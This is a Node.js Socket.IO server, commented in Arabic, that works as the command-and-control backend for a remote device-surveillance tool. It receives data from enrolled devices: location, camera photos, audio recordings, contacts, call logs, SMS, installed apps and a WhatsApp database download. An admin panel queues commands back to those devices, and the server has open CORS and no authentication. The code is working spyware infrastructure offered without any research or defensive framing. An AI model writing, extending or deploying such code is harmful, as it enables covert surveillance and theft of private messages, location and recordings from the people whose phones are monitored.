const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const server = http.createServer(app);
const io = new Server(server, { 
  cors: { 
    origin: "*", 
    methods: ["GET", "POST"] 
  } 
});

const port = process.env.PORT || 8080;
server.listen(port, () => console.log(`[LOG] Server running on port ${port}`));

// تخزين البيانات في الذاكرة (يمكن استبدالها بقاعدة بيانات)
const devices = {}; // {id -> device object}
const logs = [];
const commandsQueue = {}; // قائمة انتظار للأوامر {deviceId -> [commands]}

// إضافة سجل للأحداث
function addLog(msg, type = 'info') {
  const logEntry = { 
    ts: Date.now(), 
    msg, 
    type 
  };
  logs.push(logEntry);
  console.log(`[${type.toUpperCase()}]`, msg);
  
  // إرسال السجل إلى جميع عملاء الإدارة
  io.emit('log', logEntry);
  
  // الحفاظ على حجم السجلات
  if (logs.length > 2000) logs.shift();
}

// معالجة أوامر الأجهزة
function processCommand(deviceId, command) {
  if (!commandsQueue[deviceId]) {
    commandsQueue[deviceId] = [];
  }
  
  commandsQueue[deviceId].push(command);
  
  // إرسال الأمر إلى الجهاز إذا كان متصلاً
  const device = devices[deviceId];
  if (device && device.socketId) {
    const socket = io.sockets.sockets.get(device.socketId);
    if (socket) {
      socket.emit('command', command);
      addLog(`تم إرسال الأمر ${command.action} إلى الجهاز ${deviceId}`);
    }
  }
}

// معالج الاتصالات الرئيسي
io.on('connection', (socket) => {
  addLog(`عميل متصل: ${socket.id}`, 'info');

  // إدارة الانضمام
  socket.on('adminJoin', () => {
    // إرسال لقطة حالية للأجهزة
    Object.values(devices).forEach(device => {
      socket.emit('join', device);
    });
    addLog('مدير النظام انضم: ' + socket.id, 'info');
  });

  // انضمام جهاز جديد
  socket.on('join', (payload) => {
    const id = payload.id || ('device_' + Math.floor(Math.random() * 10000));
    const now = Date.now();
    const device = devices[id] || {};
    
    // تحديث بيانات الجهاز
    device.id = id;
    device.name = payload.name || device.name || `جهاز ${id.substring(0, 6)}`;
    device.model = payload.model || payload.userAgent || device.model;
    device.language = payload.language || device.language;
    device.screen = payload.screen || device.screen;
    device.platform = payload.platform || device.platform;
    device.cookiesEnabled = payload.cookiesEnabled ?? device.cookiesEnabled;
    device.ip = payload.ip || device.ip || socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    device.socketId = socket.id;
    device.lastSeen = now;
    device.connected = true;
    
    devices[id] = device;
    addLog(`جهاز انضم: ${id} - IP: ${device.ip}`, 'success');
    
    // إعلام جميع المدراء
    io.emit('join', device);
    
    // معالجة أي أوامر في قائمة الانتظار
    if (commandsQueue[id] && commandsQueue[id].length > 0) {
      commandsQueue[id].forEach(command => {
        socket.emit('command', command);
      });
      addLog(`تم إرسال ${commandsQueue[id].length} أمر إلى الجهاز ${id}`);
      commandsQueue[id] = [];
    }
  });

  // معلومات عامة عن الجهاز
  socket.on('deviceInfo', (payload) => {
    const id = payload.id;
    if (!id) return;
    
    devices[id] = devices[id] || { id };
    devices[id].extra = payload.extra || payload;
    devices[id].lastSeen = Date.now();
    
    addLog(`معلومات جهاز من ${id}`, 'info');
    io.emit('deviceInfo', { id, extra: devices[id].extra });
  });

  // معلومات البطارية
  socket.on('battery', (payload) => {
    const id = payload.id; 
    if (!id) return;
    
    devices[id] = devices[id] || { id };
    devices[id].battery = payload.data;
    devices[id].lastSeen = Date.now();
    
    addLog(`بطارية من ${id}: ${JSON.stringify(payload.data)}`, 'info');
    io.emit('battery', { id, data: payload.data });
  });

  // معلومات الشبكة
  socket.on('networkInfo', (payload) => {
    const id = payload.id; 
    if (!id) return;
    
    devices[id] = devices[id] || { id };
    devices[id].network = payload.data;
    devices[id].lastSeen = Date.now();
    
    addLog(`معلومات شبكة من ${id}`, 'info');
    io.emit('networkInfo', { id, data: payload.data });
  });

  // الموقع الجغرافي
  socket.on('getLocation', (payload) => {
    const id = payload.id; 
    if (!id) return;
    
    devices[id] = devices[id] || { id };
    devices[id].lastLocation = payload.data;
    devices[id].lastSeen = Date.now();
    
    // تخزين الإحداثيات للخريطة
    if (payload.data.lat && payload.data.lng) {
      devices[id].lat = payload.data.lat;
      devices[id].lng = payload.data.lng;
      devices[id].accuracy = payload.data.accuracy;
    }
    
    addLog(`موقع من ${id}: ${JSON.stringify(payload.data)}`, 'info');
    io.emit('getLocation', { id, data: payload.data });
  });

  // الصور (بيانات base64)
  socket.on('photo', (payload) => {
    const id = payload.id; 
    if (!id) return;
    
    devices[id] = devices[id] || { id };
    devices[id].lastPhoto = { 
      ts: Date.now(), 
      data: payload.data // بيانات الصورة بصيغة base64
    };
    devices[id].lastSeen = Date.now();
    
    addLog(`صورة مستلمة من ${id}`, 'info');
    io.emit('photo', { id, data: payload.data });
  });

  // التسجيلات الصوتية (بيانات base64)
  socket.on('audio', (payload) => {
    const id = payload.id; 
    if (!id) return;
    
    devices[id] = devices[id] || { id };
    devices[id].lastAudio = { 
      ts: Date.now(), 
      data: payload.data // بيانات الصوت بصيغة base64
    };
    devices[id].lastSeen = Date.now();
    
    addLog(`تسجيل صوتي من ${id}`, 'info');
    io.emit('audio', { id, data: payload.data });
  });

  // الأحداث الأخرى (التطبيقات، جهات الاتصال، الرسائل، المكالمات، إلخ)
  const otherEvents = [
    'getInstalledApps', 'getContacts', 'getCallLog', 
    'getSMS', 'downloadWhatsappDatabase', 'getExtraData'
  ];
  
  otherEvents.forEach(ev => {
    socket.on(ev, (payload) => {
      const id = payload.id;
      if (!id) return;
      
      devices[id] = devices[id] || { id };
      devices[id][ev] = payload.data;
      devices[id].lastSeen = Date.now();
      
      addLog(`${ev} من ${id}`, 'info');
      io.emit(ev, { id, data: payload.data });
    });
  });

  // استقبال الأوامر من واجهة الإدارة
  socket.on('sendCommand', (command) => {
    const { deviceId, action, data } = command;
    
    if (!deviceId) {
      socket.emit('commandResult', { 
        success: false, 
        message: 'معرف الجهاز مطلوب' 
      });
      return;
    }
    
    addLog(`أمر مستلم: ${action} للجهاز ${deviceId}`, 'info');
    
    // إرسال الأمر إلى الجهاز
    processCommand(deviceId, { action, data });
    
    socket.emit('commandResult', { 
      success: true, 
      message: 'تم إرسال الأمر إلى الجهاز' 
    });
  });

  // طلب الحصول على الأجهزة
  socket.on('getDevices', () => {
    socket.emit('devices', Object.values(devices));
  });

  // فصل العميل
  socket.on('disconnect', (reason) => {
    addLog(`عميل انقطع: ${socket.id} (${reason})`, 'warning');
    
    // تحديث حالة الجهاز إذا كان متصلاً
    for (const id in devices) {
      if (devices[id].socketId === socket.id) {
        devices[id].socketId = null;
        devices[id].connected = false;
        devices[id].lastSeen = Date.now();
        
        io.emit('deviceDisconnected', id);
        addLog(`جهاز انقطع: ${id}`, 'warning');
      }
    }
  });
});

// مسارات HTTP الإضافية
app.get('/api/devices', (req, res) => {
  res.json(Object.values(devices));
});

app.get('/api/logs', (req, res) => {
  const limit = parseInt(req.query.limit) || 100;
  res.json(logs.slice(-limit));
});

app.get('/api/device/:id', (req, res) => {
  const device = devices[req.params.id];
  if (device) {
    res.json(device);
  } else {
    res.status(404).json({ error: 'الجهاز غير موجود' });
  }
});

// خدمة واجهة المستخدم إذا كانت موجودة
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// بدء تنظيف الأجهزة غير النشطة دورياً
setInterval(() => {
  const now = Date.now();
  const inactiveTime = 30 * 60 * 1000; // 30 دقيقة
  
  for (const id in devices) {
    if (now - devices[id].lastSeen > inactiveTime && !devices[id].connected) {
      addLog(`إزالة جهاز غير نشط: ${id}`, 'warning');
      delete devices[id];
      
      if (commandsQueue[id]) {
        delete commandsQueue[id];
      }
      
      io.emit('deviceRemoved', id);
    }
  }
}, 10 * 60 * 1000); // كل 10 دقائق

// معالجة الأخطاء غير المتوقعة
process.on('uncaughtException', (error) => {
  addLog(`خطأ غير متوقع: ${error.message}`, 'error');
});

process.on('unhandledRejection', (reason, promise) => {
  addLog(`رفض غير معالج: ${reason}`, 'error');
});
